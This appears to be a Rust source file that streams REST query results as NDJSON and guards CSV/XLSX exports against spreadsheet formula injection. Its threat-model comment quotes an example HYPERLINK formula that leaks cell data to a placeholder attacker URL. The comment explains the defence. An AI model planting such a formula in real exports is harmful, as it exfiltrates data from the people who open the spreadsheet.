//! NDJSON streaming response handler for the REST transport.
//!
//! When a client sends `Accept: application/x-ndjson`, the GET handler delegates
//! to this module.  Each row is serialized as a single JSON line, with no
//! envelope (`data`/`meta`/`links`), enabling constant-memory streaming for
//! large result sets.
//!
//! Rows are fetched from the database in batches (configured via
//! `ndjson_batch_size`), serialized to NDJSON, and streamed to the client
//! incrementally.  Memory usage is bounded by `O(batch_size)` rather than
//! `O(total_rows)`.

pub mod helpers;

#[cfg(feature = "export-csv")]
pub mod csv;

#[cfg(feature = "export-xlsx")]
pub mod xlsx;

#[cfg(test)]
mod tests;

// #1274: both export writers take their header from the projection. The cases drive
// `handle_csv_get` and `handle_xlsx_get`, so they need both writers compiled in.
#[cfg(all(test, feature = "export-csv", feature = "export-xlsx"))]
mod export_header_tests;

// #1273: what an export does with the six pagination parameters — which of them it
// refuses, and which it applies. The cases drive `handle_csv_get`, so they need the CSV
// writer compiled in.
#[cfg(all(test, feature = "export-csv"))]
mod export_pagination_tests;

// #1275: the `?rel.field=value` filters an export accepts but can never honour. The cases
// drive `handle_csv_get`, so they need the CSV writer compiled in.
#[cfg(all(test, feature = "export-csv"))]
mod export_embedding_filter_tests;

use axum::http::{HeaderMap, HeaderValue};
use bytes::Bytes;
use fraiseql_core::{db::traits::DatabaseAdapter, security::SecurityContext};
use futures::{StreamExt as _, stream};

use super::handler::{ResolvedGetQuery, RestError, RestHandler, set_request_id};

/// Content type for NDJSON responses.
pub const NDJSON_CONTENT_TYPE: &str = "application/x-ndjson";

/// Check whether an `Accept` header value requests NDJSON.
#[must_use]
pub fn accepts_ndjson(headers: &HeaderMap) -> bool {
    headers.get("accept").and_then(|v| v.to_str().ok()).is_some_and(|accept| {
        accept
            .split(',')
            .any(|part| part.trim().eq_ignore_ascii_case(NDJSON_CONTENT_TYPE))
    })
}

/// Execute a query and return results as a streaming NDJSON response.
///
/// Rows are fetched in batches from the database and streamed to the client
/// as they arrive.  Each row is a JSON object followed by `\n`.  Memory usage
/// is bounded by the configured `ndjson_batch_size` rather than total rows.
///
/// Delegates route resolution and query building to
/// [`RestHandler::resolve_streaming_get_query`], which is also where every request
/// rule an export does not share with the JSON envelope is applied.
///
/// # Errors
///
/// Returns `RestError` on route resolution, parameter extraction, or initial
/// query setup failure.  Errors that occur mid-stream are emitted as a
/// trailing NDJSON error line: `{"error":"..."}\n`.
pub async fn handle_ndjson_get<A: DatabaseAdapter + 'static>(
    handler: &RestHandler<'_, A>,
    relative_path: &str,
    query_pairs: &[(&str, &str)],
    headers: &HeaderMap,
    security_context: Option<&SecurityContext>,
) -> Result<NdjsonResponse, RestError> {
    // Every request rule the export representations do not share with the JSON envelope
    // — count, pagination, and the `?select=` embeds and counts of #1268 — is applied by
    // `resolve_streaming_get_query`, so a handler cannot serve a request the others
    // refuse.
    let resolved = handler.resolve_streaming_get_query(relative_path, query_pairs, headers)?;

    let ResolvedGetQuery {
        query_match,
        variables,
        params,
        ..
    } = resolved;

    let batch_size = handler.config().ndjson_batch_size.max(1);

    // The row source opens before any header is sent, so a refusal — authorization,
    // a gated field, a tenant-scoped query with no principal — is still an ordinary
    // HTTP error rather than an error line inside a 200 (#958).
    let rows = helpers::export_rows(
        handler.executor(),
        query_match,
        variables,
        security_context.cloned(),
        // The export total: `?limit=` on an offset route, `?first=` on a relay one
        // (#1278 — each family's count). Absence means "the whole table",
        // which is what an export is for (#811). It is read from what the client sent,
        // because the resolved plan fills an absent `?limit=` with `default_page_size`
        // and the two mean opposite things here.
        params.requested_pagination.export_total(),
    )
    .await?;

    // Build response headers eagerly (before starting the stream).
    let mut response_headers = HeaderMap::new();
    set_request_id(headers, &mut response_headers);
    response_headers.insert("content-type", HeaderValue::from_static(NDJSON_CONTENT_TYPE));
    response_headers.insert(
        "x-stream-batch-size",
        HeaderValue::from_str(&batch_size.to_string())
            .unwrap_or_else(|_| HeaderValue::from_static("500")),
    );

    // Rows are grouped into byte chunks so the body is not one write syscall per
    // row; `ready_chunks` takes whatever has arrived rather than waiting for a full
    // group, so a slow producer still reaches the client promptly.
    let chunks = rows.ready_chunks(usize::try_from(batch_size).unwrap_or(usize::MAX));
    let ndjson_stream = stream::unfold(Some(chunks), |state| async move {
        let mut chunks = state?;
        let chunk = chunks.next().await?;

        let (bytes, failed) = helpers::ndjson_chunk(chunk);
        Some((Ok(bytes), if failed { None } else { Some(chunks) }))
    });

    Ok(NdjsonResponse {
        headers: response_headers,
        body:    NdjsonBody::Stream(Box::pin(ndjson_stream)),
    })
}

/// NDJSON streaming response.
pub struct NdjsonResponse {
    /// Response headers.
    pub headers: HeaderMap,
    /// NDJSON body — either pre-buffered bytes or a streaming body.
    pub body:    NdjsonBody,
}

/// Body of an NDJSON response.
#[non_exhaustive]
pub enum NdjsonBody {
    /// Streaming body (batched execution).
    Stream(
        std::pin::Pin<
            Box<dyn futures::Stream<Item = Result<Bytes, std::convert::Infallible>> + Send>,
        >,
    ),
}

impl NdjsonBody {
    /// Convert to an axum `Body`.
    pub fn into_body(self) -> axum::body::Body {
        match self {
            Self::Stream(stream) => axum::body::Body::from_stream(stream),
        }
    }
}

// ---------------------------------------------------------------------------
// Spreadsheet safety — shared by the CSV and XLSX writers
// ---------------------------------------------------------------------------

/// Single-byte sentinels that trigger formula evaluation in Excel /
/// `LibreOffice` / Numbers when they appear as the first character of a
/// cell.  Tab and CR are included because Excel will treat them as
/// whitespace-prefixed formula starters when followed by `=` etc., and
/// because both are present in OWASP's reference list for this attack.
#[cfg(any(feature = "export-csv", feature = "export-xlsx"))]
const FORMULA_INJECTION_SENTINELS: [char; 6] = ['=', '+', '-', '@', '\t', '\r'];

/// Prefixes `value` with a single quote when its first character would
/// otherwise be interpreted by a spreadsheet application as the start of
/// a formula.
///
/// **Threat model.** Any string-shaped cell that starts with one of `=`, `+`,
/// `-`, `@`, `\t`, `\r` is parsed as a formula or macro when the export is
/// opened, so a cell containing
/// `=HYPERLINK("http://attacker/?leak="&A1,"click")` exfiltrates row data to an
/// attacker-controlled URL. The single-quote prefix is the standard OWASP
/// mitigation; downstream tooling that wants the raw value sees the leading `'`
/// and must strip it.
///
/// Returns `value` unchanged for non-dangerous prefixes (the common case) so the
/// function is allocation-free on the hot path.
///
/// Lives here, above both writers, rather than in `streaming::csv` (#920): the
/// concern is shared, and `export-csv` / `export-xlsx` are independently
/// selectable, so an XLSX-only build could not see a guard that lived in the
/// CSV module.
#[cfg(any(feature = "export-csv", feature = "export-xlsx"))]
pub(crate) fn guard_formula_injection(value: &str) -> String {
    match value.chars().next() {
        Some(c) if FORMULA_INJECTION_SENTINELS.contains(&c) => {
            let mut out = String::with_capacity(value.len() + 1);
            out.push('\'');
            out.push_str(value);
            out
        },
        _ => value.to_owned(),
    }
}

// ---------------------------------------------------------------------------
// Tests
// ---------------------------------------------------------------------------
